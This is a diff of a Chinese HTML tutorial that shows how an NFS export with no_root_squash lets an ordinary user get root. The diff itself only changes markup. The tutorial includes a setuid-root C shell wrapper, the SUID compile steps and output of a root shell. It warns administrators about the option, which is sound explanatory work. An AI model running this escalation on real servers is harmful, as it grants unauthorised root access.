@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="zh">
 <head>
-<!-- 2022-03-03 Thu 11:48 -->
+<!-- 2023-05-06 Sat 10:09 -->
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>利用nfs no_root_squash获取root权限</title>
@@ -62,28 +62,28 @@
 <h2>Table of Contents</h2>
 <div id="text-table-of-contents" role="doc-toc">
 <ul>
-<li><a href="#org2f96e90">no_root_squash</a></li>
-<li><a href="#org90553cf">系统环境说明</a>
+<li><a href="#orgad0221b">no_root_squash</a></li>
+<li><a href="#org2b9a44a">系统环境说明</a>
 <ul>
-<li><a href="#orgfc98154">Host NFS配制选项</a></li>
-<li><a href="#org2cb37af">Guest OS挂载选项</a></li>
+<li><a href="#org9b4ab9a">Host NFS配制选项</a></li>
+<li><a href="#org832525d">Guest OS挂载选项</a></li>
 </ul>
 </li>
-<li><a href="#org14c76cc">通过no_root_squash来获取root权限</a>
+<li><a href="#org1412d58">通过no_root_squash来获取root权限</a>
 <ul>
-<li><a href="#org47beb0a">准备一个C程序，用来获取root权限</a></li>
-<li><a href="#org8cc4798">编译,在Host Computer中给binary添加SUID标志</a></li>
-<li><a href="#org78d6bf4">到nfs服务器上以普通用户身份运行</a></li>
-<li><a href="#org50f12b6">成功获取root权限</a></li>
+<li><a href="#org9cd41c4">准备一个C程序，用来获取root权限</a></li>
+<li><a href="#orgf837fb8">编译,在Host Computer中给binary添加SUID标志</a></li>
+<li><a href="#org33ab629">到nfs服务器上以普通用户身份运行</a></li>
+<li><a href="#orgc46505b">成功获取root权限</a></li>
 </ul>
 </li>
 </ul>
 </div>
 </div>
 
-<div id="outline-container-org2f96e90" class="outline-2">
-<h2 id="org2f96e90">no_root_squash</h2>
-<div class="outline-text-2" id="text-org2f96e90">
+<div id="outline-container-orgad0221b" class="outline-2">
+<h2 id="orgad0221b">no_root_squash</h2>
+<div class="outline-text-2" id="text-orgad0221b">
 <p>
 nfs服务器配置时,很多人并不注意其中的安全选项，直接写上no_root_squash标志。<br>
 需要注意的是，如果写上这个标志，等于直接将系统的root权限分享给了共享者。下面通过一个实例来演示如何通过no_root_squash标志来获取系统的root权限。<br>
@@ -91,9 +91,9 @@ nfs服务器配置时,很多人并不注意其中的安全选项，直接写上n
 </div>
 </div>
 
-<div id="outline-container-org90553cf" class="outline-2">
-<h2 id="org90553cf">系统环境说明</h2>
-<div class="outline-text-2" id="text-org90553cf">
+<div id="outline-container-org2b9a44a" class="outline-2">
+<h2 id="org2b9a44a">系统环境说明</h2>
+<div class="outline-text-2" id="text-org2b9a44a">
 <table>
 
 
@@ -126,18 +126,18 @@ nfs服务器配置时,很多人并不注意其中的安全选项，直接写上n
 </table>
 </div>
 
-<div id="outline-container-orgfc98154" class="outline-3">
-<h3 id="orgfc98154">Host NFS配制选项</h3>
-<div class="outline-text-3" id="text-orgfc98154">
+<div id="outline-container-org9b4ab9a" class="outline-3">
+<h3 id="org9b4ab9a">Host NFS配制选项</h3>
+<div class="outline-text-3" id="text-org9b4ab9a">
 <div class="org-src-container">
 <pre class="src src-bash"><code>/home/xxx/share/nfs *(sync,rw,no_root_squash,no_subtree_check)</code>
 </pre>
 </div>
 </div>
 </div>
-<div id="outline-container-org2cb37af" class="outline-3">
-<h3 id="org2cb37af">Guest OS挂载选项</h3>
-<div class="outline-text-3" id="text-org2cb37af">
+<div id="outline-container-org832525d" class="outline-3">
+<h3 id="org832525d">Guest OS挂载选项</h3>
+<div class="outline-text-3" id="text-org832525d">
 <div class="org-src-container">
 <pre class="src src-bash"><code>sudo mount -t nfs4 10.106.58.18:/home/xxx/share/nfs aaa</code>
 </pre>
@@ -146,72 +146,72 @@ nfs服务器配置时,很多人并不注意其中的安全选项，直接写上n
 </div>
 </div>
 
-<div id="outline-container-org14c76cc" class="outline-2">
-<h2 id="org14c76cc">通过no_root_squash来获取root权限</h2>
-<div class="outline-text-2" id="text-org14c76cc">
+<div id="outline-container-org1412d58" class="outline-2">
+<h2 id="org1412d58">通过no_root_squash来获取root权限</h2>
+<div class="outline-text-2" id="text-org1412d58">
 </div>
-<div id="outline-container-org47beb0a" class="outline-3">
-<h3 id="org47beb0a">准备一个C程序，用来获取root权限</h3>
-<div class="outline-text-3" id="text-org47beb0a">
+<div id="outline-container-org9cd41c4" class="outline-3">
+<h3 id="org9cd41c4">准备一个C程序，用来获取root权限</h3>
+<div class="outline-text-3" id="text-org9cd41c4">
 <p>
 内容如下，直接跑命令进入shell就行<br>
 </p>
 <div class="org-src-container">
-<pre class="src src-C"><code><span style="color: #51afef; font-weight: bold;">#include</span> <span style="color: #98be65;">&lt;stdio.h&gt;</span></code>
-<code><span style="color: #51afef; font-weight: bold;">#include</span> <span style="color: #98be65;">&lt;stdlib.h&gt;</span></code>
-<code><span style="color: #51afef; font-weight: bold;">#include</span> <span style="color: #98be65;">&lt;unistd.h&gt;</span></code>
+<pre class="src src-C"><code><span class="org-preprocessor">#include</span> <span class="org-string">&lt;stdio.h&gt;</span></code>
+<code><span class="org-preprocessor">#include</span> <span class="org-string">&lt;stdlib.h&gt;</span></code>
+<code><span class="org-preprocessor">#include</span> <span class="org-string">&lt;unistd.h&gt;</span></code>
 <code></code>
-<code><span style="color: #ECBE7B;">int</span> <span style="color: #c678dd;">main</span>(<span style="color: #ECBE7B;">int</span> <span style="color: #dcaeea;">argc</span>, <span style="color: #ECBE7B;">char</span> *<span style="color: #dcaeea;">argv</span>[])</code>
+<code><span class="org-type">int</span> <span class="org-function-name">main</span>(<span class="org-type">int</span> <span class="org-variable-name">argc</span>, <span class="org-type">char</span> *<span class="org-variable-name">argv</span>[])</code>
 <code>{</code>
 <code></code>
-<code>    (<span style="color: #ECBE7B;">void</span>) argc;</code>
-<code>    (<span style="color: #ECBE7B;">void</span>) argv;</code>
+<code>    (<span class="org-type">void</span>) argc;</code>
+<code>    (<span class="org-type">void</span>) argv;</code>
 <code></code>
-<code>    printf(<span style="color: #98be65;">"real uid\t %d\n"</span>,getuid());</code>
-<code>    printf(<span style="color: #98be65;">"effective uid\t %d\n"</span>,geteuid());</code>
-<code>    <span style="color: #51afef;">if</span>(setuid(0) == -1)</code>
+<code>    printf(<span class="org-string">"real uid\t %d\n"</span>,getuid());</code>
+<code>    printf(<span class="org-string">"effective uid\t %d\n"</span>,geteuid());</code>
+<code>    <span class="org-keyword">if</span>(setuid(0) == -1)</code>
 <code>    {</code>
-<code>        perror(<span style="color: #98be65;">"setuid(0) failed"</span>);</code>
+<code>        perror(<span class="org-string">"setuid(0) failed"</span>);</code>
 <code>    }</code>
 <code></code>
-<code>    <span style="color: #51afef;">return</span> system(<span style="color: #98be65;">"bash"</span>);</code>
+<code>    <span class="org-keyword">return</span> system(<span class="org-string">"bash"</span>);</code>
 <code>}</code>
 </pre>
 </div>
 </div>
 </div>
-<div id="outline-container-org8cc4798" class="outline-3">
-<h3 id="org8cc4798">编译,在Host Computer中给binary添加SUID标志</h3>
-<div class="outline-text-3" id="text-org8cc4798">
+<div id="outline-container-orgf837fb8" class="outline-3">
+<h3 id="orgf837fb8">编译,在Host Computer中给binary添加SUID标志</h3>
+<div class="outline-text-3" id="text-orgf837fb8">
 <div class="org-src-container">
-<pre class="src src-bash"><code><span style="color: #c678dd;">cd</span> aaa</code>
+<pre class="src src-bash"><code><span class="org-builtin">cd</span> aaa</code>
 <code>gcc test.c -o test.bin</code>
 <code>sudo chmod root:root test.bin</code>
 <code>sudo chmod u+s test.bin</code>
-<code>ls -al test.bin </code>
+<code>ls -al test.bin</code>
 <code>-rwsr-xr-x 1 root root 16744  8&#26376;  8 16:33 test.bin</code>
 </pre>
 </div>
 </div>
 </div>
-<div id="outline-container-org78d6bf4" class="outline-3">
-<h3 id="org78d6bf4">到nfs服务器上以普通用户身份运行</h3>
-<div class="outline-text-3" id="text-org78d6bf4">
+<div id="outline-container-org33ab629" class="outline-3">
+<h3 id="org33ab629">到nfs服务器上以普通用户身份运行</h3>
+<div class="outline-text-3" id="text-org33ab629">
 <div class="org-src-container">
-<pre class="src src-bash"><code>test-user@server-70ubs00702:~$ ls -al /home/xxx/share/nfs/test.bin </code>
+<pre class="src src-bash"><code>test-user@server-70ubs00702:~$ ls -al /home/xxx/share/nfs/test.bin</code>
 <code>-rwsr-xr-x 1 root root 16744 Aug  8 16:33 /home/xxx/share/nfs/test.bin</code>
-<code>test-user@server-70ubs00702:~$ /home/xxx/share/nfs/test.bin </code>
+<code>test-user@server-70ubs00702:~$ /home/xxx/share/nfs/test.bin</code>
 <code>real uid     1001</code>
 <code>effective uid    0</code>
 <code>root@server-70ubs00702:~# id</code>
-<code><span style="color: #dcaeea;">uid</span>=0(root) <span style="color: #dcaeea;">gid</span>=1001(test-user) <span style="color: #dcaeea;">groups</span>=1001(test-user)</code>
+<code><span class="org-variable-name">uid</span>=0(root) <span class="org-variable-name">gid</span>=1001(test-user) <span class="org-variable-name">groups</span>=1001(test-user)</code>
 </pre>
 </div>
 </div>
 </div>
-<div id="outline-container-org50f12b6" class="outline-3">
-<h3 id="org50f12b6">成功获取root权限</h3>
-<div class="outline-text-3" id="text-org50f12b6">
+<div id="outline-container-orgc46505b" class="outline-3">
+<h3 id="orgc46505b">成功获取root权限</h3>
+<div class="outline-text-3" id="text-orgc46505b">
 <p>
 上面已经成功进入uid=0的shell中<br>
 </p>
